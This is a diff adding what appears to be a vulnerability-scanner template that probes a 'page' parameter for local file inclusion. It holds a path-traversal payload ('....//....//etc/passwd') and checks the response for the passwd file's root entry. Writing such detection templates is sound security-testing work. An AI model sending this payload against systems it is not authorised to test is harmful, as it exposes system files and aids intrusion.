@@ -1,0 +1,20 @@
+id: lfi-083
+name: 'Path traversal via page'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /etc/passwd via page'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - '....//....//etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
